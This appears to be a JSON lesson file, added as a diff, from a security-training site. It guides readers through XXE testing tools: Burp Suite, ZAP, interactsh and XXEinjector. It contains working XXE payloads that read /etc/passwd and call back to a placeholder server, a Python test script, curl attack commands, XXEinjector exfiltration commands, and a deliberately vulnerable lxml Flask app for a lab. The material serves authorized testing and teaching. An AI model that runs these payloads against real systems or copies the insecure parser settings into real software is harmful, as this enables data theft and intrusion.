@@ -1,0 +1,124 @@
+{
+  "id": "testing-tools",
+  "category": "testing",
+  "title": "XXE Testing Tools",
+  "description": "Comprehensive guide to tools and frameworks for testing XXE vulnerabilities, from manual testing tools to automated scanners.",
+  "severity": "info",
+  "cvssScore": 0,
+  "cvssVector": "",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "Effective XXE testing requires a combination of manual techniques and automated tools. This guide covers essential tools for XXE detection, exploitation, and validation.\n\n**Tool Categories:**\n• **Proxy Tools** - Burp Suite, OWASP ZAP for request manipulation\n• **OOB Platforms** - Burp Collaborator, interactsh for blind XXE\n• **Exploitation Tools** - XXEinjector, automated exploitation\n• **Scanners** - Automated vulnerability detection\n• **Custom Scripts** - Python/Ruby scripts for specific scenarios\n\n**Testing Workflow:**\n1. **Manual Testing** - Use proxy to craft and send payloads\n2. **OOB Detection** - Set up callback infrastructure\n3. **Automated Scanning** - Run scanners for comprehensive coverage\n4. **Exploitation** - Use specialized tools for confirmed vulnerabilities\n5. **Validation** - Verify findings manually\n\n**Recommended Setup:**\n• Primary: Burp Suite Professional (or Community Edition)\n• OOB: Burp Collaborator or interactsh.com\n• Automation: Custom scripts + scanners\n• Documentation: Note-taking tool for findings"
+    },
+    {
+      "id": "burp-suite",
+      "title": "Burp Suite (Primary Tool)",
+      "type": "text",
+      "content": "**Burp Suite for XXE Testing:**\nBurp Suite is the industry-standard web application security testing tool, essential for XXE testing.\n\n**Key Features:**\n• **Proxy** - Intercept and modify XML requests\n• **Repeater** - Resend requests with modified payloads\n• **Collaborator** (Pro) - Out-of-band interaction detection\n• **Scanner** (Pro) - Automated XXE detection\n• **Intruder** - Payload iteration and fuzzing\n\n**Burp Suite Editions:**\n• **Community Edition** - Free, includes Proxy and Repeater\n• **Professional** - Paid, includes Collaborator and Scanner\n\n**XXE Testing Workflow:**\n1. Intercept XML request in Proxy\n2. Send to Repeater\n3. Inject XXE payload\n4. Send request, analyze response\n5. Use Collaborator for blind XXE\n6. Document findings\n\n**Burp Collaborator:**\n• Generates unique subdomain for OOB testing\n• Captures HTTP, DNS, and SMTP interactions\n• Ideal for blind XXE detection\n• Automatically correlates callbacks with requests"
+    },
+    {
+      "id": "burp-workflow",
+      "title": "Burp Suite XXE Testing Workflow",
+      "type": "code",
+      "code": {
+        "language": "text",
+        "code": "# Burp Suite XXE Testing Step-by-Step\n\n## 1. Proxy Setup\n- Configure browser to use Burp proxy (127.0.0.1:8080)\n- Enable intercept in Proxy tab\n- Navigate to target application\n\n## 2. Identify XML Endpoint\n- Look for POST requests with Content-Type: application/xml\n- Check API endpoints, SOAP services\n- Intercept file upload requests (SVG, DOCX, etc.)\n\n## 3. Inject XXE Payload\n- Right-click intercepted request → Send to Repeater\n- In Repeater, modify XML body:\n  \n  Original:\n  <?xml version=\"1.0\"?>\n  <root>\n    <data>test</data>\n  </root>\n  \n  Modified:\n  <?xml version=\"1.0\"?>\n  <!DOCTYPE root [\n    <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n  ]>\n  <root>\n    <data>&xxe;</data>\n  </root>\n\n## 4. Send and Analyze\n- Click \"Send\" in Repeater\n- Check response for file contents\n- Look for error messages revealing paths\n- Note response time changes\n\n## 5. Burp Collaborator (Pro Only)\n- Click \"Burp Collaborator client\" in Burp menu\n- Click \"Copy to clipboard\" to get unique domain\n- Inject payload with Collaborator domain:\n  \n  <!DOCTYPE root [\n    <!ENTITY xxe SYSTEM \"http://BURP-COLLAB-SUBDOMAIN.burpcollaborator.net/xxe\">\n  ]>\n  <root><data>&xxe;</data></root>\n  \n- Send request\n- Check Collaborator client for HTTP requests\n- Interaction = Blind XXE confirmed\n\n## 6. Scanner (Pro Only)\n- Right-click request → \"Do active scan\"\n- Scanner will automatically test XXE payloads\n- Review findings in \"Target\" → \"Site map\"\n\n## 7. Document Findings\n- Take screenshots of successful payloads\n- Note exact request/response\n- Document impact (files read, SSRF capabilities)\n- Export requests for report",
+        "isVulnerable": false,
+        "filename": "burp-workflow.txt"
+      }
+    },
+    {
+      "id": "owasp-zap",
+      "title": "OWASP ZAP (Free Alternative)",
+      "type": "text",
+      "content": "**OWASP ZAP for XXE Testing:**\nFree, open-source alternative to Burp Suite with XXE detection capabilities.\n\n**Key Features:**\n• **Intercepting Proxy** - Intercept and modify requests\n• **Active Scanner** - Automated vulnerability scanning\n• **Fuzzer** - Payload fuzzing capabilities\n• **API Support** - Script and automate testing\n• **100% Free** - No paid tier\n\n**XXE in ZAP:**\n• Built-in active scan rules for XXE\n• Can intercept and modify XML requests\n• Supports custom payloads via fuzzer\n• API for automation\n\n**Limitations vs Burp:**\n• No built-in OOB platform (need external service)\n• Scanner less comprehensive\n• UI less polished\n\n**When to Use:**\n• Budget constraints\n• Open-source requirements\n• Automated scanning in CI/CD\n• Basic manual testing"
+    },
+    {
+      "id": "interactsh",
+      "title": "Interactsh (Free OOB Platform)",
+      "type": "text",
+      "content": "**Interactsh for Blind XXE:**\nFree, open-source platform for detecting out-of-band interactions.\n\n**What is Interactsh:**\n• Free alternative to Burp Collaborator\n• Detects HTTP, DNS, SMTP interactions\n• Web interface and CLI available\n• Self-hostable or use public instance\n\n**Usage:**\n1. Visit interactsh.com or run CLI\n2. Generate unique domain (e.g., abc123.oast.fun)\n3. Use in XXE payload:\n   ```xml\n   <!ENTITY xxe SYSTEM \"http://abc123.oast.fun/xxe\">\n   ```\n4. Check interactsh for interactions\n5. HTTP/DNS request = blind XXE confirmed\n\n**CLI Usage:**\n```bash\n# Install\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n\n# Run\ninteractsh-client\n\n# Use generated domain in XXE payload\n# Watch for interactions in terminal\n```\n\n**Self-Hosting:**\n• Full control over data\n• No reliance on third-party service\n• Customizable domain\n• Docker deployment available"
+    },
+    {
+      "id": "xxeinjector",
+      "title": "XXEinjector (Automated Exploitation)",
+      "type": "text",
+      "content": "**XXEinjector:**\nRuby-based tool for automated XXE exploitation and data exfiltration.\n\n**Features:**\n• Automated file disclosure via XXE\n• OOB data exfiltration\n• Enumerates files and directories\n• Supports various encoding schemes\n• SSRF exploitation\n• Java jar:// and netdoc:// exploitation\n\n**Installation:**\n```bash\ngit clone https://github.com/enjoiz/XXEinjector.git\ncd XXEinjector\ngem install nokogiri\n```\n\n**Basic Usage:**\n```bash\n# Enumerate files\nruby XXEinjector.rb --host=192.168.1.100 --path=/api/xml --file=/tmp/request.txt --enumerate\n\n# Read specific file\nruby XXEinjector.rb --host=192.168.1.100 --path=/api/xml --file=/tmp/request.txt --target=/etc/passwd\n\n# OOB exploitation\nruby XXEinjector.rb --host=192.168.1.100 --path=/api/xml --file=/tmp/request.txt --oob=http --phpfilter\n```\n\n**When to Use:**\n• Confirmed XXE vulnerability\n• Need to extract multiple files\n• Automated data exfiltration\n• Testing blind XXE variants\n\n**Limitations:**\n• Requires Ruby environment\n• Can be noisy (multiple requests)\n• May trigger rate limiting\n• Requires manual request template"
+    },
+    {
+      "id": "custom-scripts",
+      "title": "Custom Python Scripts",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"Simple XXE testing script\"\"\"\n\nimport requests\nimport sys\n\ndef test_xxe(url, file_path):\n    \"\"\"\n    Test XXE vulnerability by attempting file disclosure\n    \n    Args:\n        url: Target URL that accepts XML\n        file_path: File to attempt to read (e.g., /etc/passwd)\n    \"\"\"\n    \n    # XXE payload\n    payload = f'''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file://{file_path}\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>'''\n    \n    headers = {\n        'Content-Type': 'application/xml',\n        'User-Agent': 'XXE-Tester/1.0'\n    }\n    \n    try:\n        print(f\"[*] Testing XXE on {url}\")\n        print(f\"[*] Attempting to read: {file_path}\")\n        \n        response = requests.post(\n            url,\n            data=payload,\n            headers=headers,\n            timeout=10\n        )\n        \n        print(f\"[*] Status Code: {response.status_code}\")\n        print(f\"[*] Response Length: {len(response.text)}\")\n        \n        # Check if file contents in response\n        if 'root:' in response.text or 'daemon:' in response.text:\n            print(\"[+] VULNERABLE! File contents found in response:\")\n            print(response.text[:500])  # First 500 chars\n            return True\n        else:\n            print(\"[-] No file contents detected\")\n            print(\"[*] Response preview:\")\n            print(response.text[:200])\n            return False\n            \n    except requests.exceptions.RequestException as e:\n        print(f\"[!] Error: {e}\")\n        return False\n\ndef test_xxe_oob(url, callback_url):\n    \"\"\"\n    Test blind XXE with out-of-band callback\n    \n    Args:\n        url: Target URL\n        callback_url: Your server URL (or Burp Collaborator)\n    \"\"\"\n    \n    payload = f'''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"{callback_url}\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>'''\n    \n    headers = {'Content-Type': 'application/xml'}\n    \n    try:\n        print(f\"[*] Testing blind XXE on {url}\")\n        print(f\"[*] Callback URL: {callback_url}\")\n        print(\"[*] Check your server logs for incoming request\")\n        \n        response = requests.post(url, data=payload, headers=headers, timeout=10)\n        print(f\"[*] Request sent. Status: {response.status_code}\")\n        print(\"[*] Check callback server for interaction\")\n        \n    except requests.exceptions.RequestException as e:\n        print(f\"[!] Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        print(\"Usage: python xxe_test.py <url> [file_path]\")\n        print(\"Example: python xxe_test.py http://target.com/api/xml /etc/passwd\")\n        sys.exit(1)\n    \n    url = sys.argv[1]\n    file_path = sys.argv[2] if len(sys.argv) > 2 else \"/etc/hostname\"\n    \n    # Test classic XXE\n    test_xxe(url, file_path)\n    \n    # Test blind XXE (replace with your callback URL)\n    # test_xxe_oob(url, \"http://YOUR-SERVER.com/xxe\")",
+        "isVulnerable": false,
+        "filename": "xxe_test.py"
+      }
+    },
+    {
+      "id": "curl-testing",
+      "title": "Command-Line Testing with curl",
+      "type": "code",
+      "code": {
+        "language": "bash",
+        "code": "#!/bin/bash\n# XXE testing with curl\n\n# Basic XXE test - file disclosure\ncurl -X POST http://target.com/api/xml \\\n  -H \"Content-Type: application/xml\" \\\n  -d '<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root><data>&xxe;</data></root>'\n\n# XXE with OOB callback\ncurl -X POST http://target.com/api/xml \\\n  -H \"Content-Type: application/xml\" \\\n  -d '<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://YOUR-SERVER.com/xxe\">\n]>\n<root><data>&xxe;</data></root>'\n\n# Save payload to file for cleaner testing\ncat > xxe_payload.xml <<EOF\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\nEOF\n\n# Send saved payload\ncurl -X POST http://target.com/api/xml \\\n  -H \"Content-Type: application/xml\" \\\n  -d @xxe_payload.xml \\\n  -v  # Verbose for headers and response\n\n# Test with timeout (useful for blind XXE)\ncurl -X POST http://target.com/api/xml \\\n  -H \"Content-Type: application/xml\" \\\n  -d @xxe_payload.xml \\\n  --max-time 5 \\\n  -w \"\\nTime: %{time_total}s\\n\"\n\n# Follow redirects and save response\ncurl -X POST http://target.com/api/xml \\\n  -H \"Content-Type: application/xml\" \\\n  -d @xxe_payload.xml \\\n  -L \\\n  -o response.txt\n\necho \"Response saved to response.txt\"",
+        "isVulnerable": false,
+        "filename": "xxe_curl_test.sh"
+      }
+    },
+    {
+      "id": "scanners",
+      "title": "Automated Security Scanners",
+      "type": "text",
+      "content": "**Web Application Scanners with XXE Detection:**\n\n**1. Burp Scanner (Professional)**\n• Comprehensive XXE detection\n• Automatic payload generation\n• OOB interaction detection\n• Low false positive rate\n• **Cost:** Paid ($449/year)\n\n**2. OWASP ZAP**\n• Active scanner with XXE rules\n• Free and open-source\n• API for CI/CD integration\n• **Cost:** Free\n\n**3. Acunetix**\n• Commercial scanner\n• XXE detection capabilities\n• Detailed reporting\n• **Cost:** Paid (enterprise)\n\n**4. Netsparker**\n• Automatic XXE detection\n• Proof-based scanning\n• Low false positives\n• **Cost:** Paid\n\n**5. Nikto**\n• Free web server scanner\n• Limited XXE detection\n• Good for initial reconnaissance\n• **Cost:** Free\n\n**Scanner Limitations:**\n• May miss custom XML parsing logic\n• Limited blind XXE detection\n• Can generate false positives\n• May not test all attack vectors\n\n**Best Practice:**\nCombine automated scanning with manual testing for comprehensive coverage."
+    },
+    {
+      "id": "docker-testing-env",
+      "title": "Docker Testing Environment",
+      "type": "code",
+      "code": {
+        "language": "bash",
+        "code": "#!/bin/bash\n# Create isolated XXE testing environment with Docker\n\n# Create Dockerfile for vulnerable app (for testing purposes)\ncat > Dockerfile <<EOF\nFROM python:3.9-slim\n\nWORKDIR /app\n\n# Install dependencies\nRUN pip install flask lxml\n\n# Copy vulnerable app\nCOPY vulnerable_app.py .\n\nEXPOSE 5000\n\nCMD [\"python\", \"vulnerable_app.py\"]\nEOF\n\n# Create vulnerable Flask app (for educational/testing purposes)\ncat > vulnerable_app.py <<'EOF'\nfrom flask import Flask, request\nfrom lxml import etree\n\napp = Flask(__name__)\n\n@app.route('/parse', methods=['POST'])\ndef parse_xml():\n    # VULNERABLE: External entities enabled\n    parser = etree.XMLParser(resolve_entities=True, no_network=False)\n    \n    try:\n        xml_data = request.data\n        doc = etree.fromstring(xml_data, parser)\n        return f\"Parsed: {etree.tostring(doc).decode()}\", 200\n    except Exception as e:\n        return f\"Error: {str(e)}\", 400\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, debug=True)\nEOF\n\n# Build Docker image\ndocker build -t xxe-test-app .\n\n# Run container\ndocker run -d -p 5000:5000 --name xxe-test xxe-test-app\n\necho \"Vulnerable app running on http://localhost:5000/parse\"\necho \"Test with: curl -X POST http://localhost:5000/parse -d @xxe_payload.xml\"\n\n# Cleanup command\necho \"To stop: docker stop xxe-test && docker rm xxe-test\"",
+        "isVulnerable": false,
+        "filename": "docker_setup.sh"
+      }
+    },
+    {
+      "id": "tool-comparison",
+      "title": "Tool Comparison Matrix",
+      "type": "text",
+      "content": "**XXE Testing Tool Comparison:**\n\n**Manual Testing:**\n• **Burp Suite Pro** - ⭐⭐⭐⭐⭐ (Best overall, paid)\n• **Burp Suite Community** - ⭐⭐⭐⭐ (Great, free, no Collaborator)\n• **OWASP ZAP** - ⭐⭐⭐ (Good, free, less polished)\n• **curl** - ⭐⭐⭐ (Simple, scriptable, manual)\n\n**OOB Detection:**\n• **Burp Collaborator** - ⭐⭐⭐⭐⭐ (Best, integrated, paid)\n• **Interactsh** - ⭐⭐⭐⭐ (Excellent, free)\n• **Custom Server** - ⭐⭐⭐ (Full control, requires setup)\n\n**Automated Exploitation:**\n• **XXEinjector** - ⭐⭐⭐⭐ (Powerful, requires Ruby)\n• **Custom Scripts** - ⭐⭐⭐ (Flexible, requires development)\n• **Burp Scanner** - ⭐⭐⭐⭐ (Automated, paid)\n\n**Scanners:**\n• **Burp Scanner** - ⭐⭐⭐⭐⭐ (Most accurate, paid)\n• **OWASP ZAP Scanner** - ⭐⭐⭐ (Good, free)\n• **Acunetix** - ⭐⭐⭐⭐ (Commercial, expensive)\n• **Nikto** - ⭐⭐ (Basic, free)\n\n**Recommended Setup:**\n• **Budget:** OWASP ZAP + Interactsh + Custom scripts\n• **Professional:** Burp Suite Pro + Custom scripts\n• **Enterprise:** Burp Suite Pro + Commercial scanner + CI/CD integration"
+    },
+    {
+      "id": "tool-checklist",
+      "title": "XXE Testing Toolkit Checklist",
+      "type": "text",
+      "content": "**Essential Tools:**\n☐ **Intercepting Proxy**\n   • Burp Suite Pro/Community OR OWASP ZAP\n   • Configured and tested\n   • Browser proxy settings configured\n\n☐ **OOB Platform**\n   • Burp Collaborator (if Pro) OR\n   • Interactsh account/CLI OR\n   • Custom server with logging\n   • Tested and accessible\n\n☐ **Command-Line Tools**\n   • curl installed\n   • wget installed\n   • Basic payload files created\n\n☐ **Scripting Environment**\n   • Python 3.x installed\n   • Requests library installed (pip install requests)\n   • Basic XXE test script ready\n\n☐ **Optional Advanced Tools**\n   • XXEinjector (if testing confirmed XXE)\n   • Docker (for testing environments)\n   • Automated scanner\n\n**Configuration:**\n☐ Proxy certificate installed in browser\n☐ OOB platform tested and working\n☐ Payload templates prepared\n☐ Note-taking tool ready (Obsidian, CherryTree, etc.)\n☐ Screenshot tool configured\n\n**Pre-Testing:**\n☐ Written authorization obtained\n☐ Scope clearly defined\n☐ Tools tested on safe target first\n☐ Backup plan if tools cause issues\n☐ Communication channel with team established"
+    }
+  ],
+  "relatedTopics": ["testing-methodology", "payload-design", "blind-xxe", "classic-xxe"],
+  "references": [
+    {
+      "title": "Burp Suite",
+      "url": "https://portswigger.net/burp"
+    },
+    {
+      "title": "OWASP ZAP",
+      "url": "https://www.zaproxy.org/"
+    },
+    {
+      "title": "Interactsh",
+      "url": "https://github.com/projectdiscovery/interactsh"
+    },
+    {
+      "title": "XXEinjector",
+      "url": "https://github.com/enjoiz/XXEinjector"
+    }
+  ]
+}
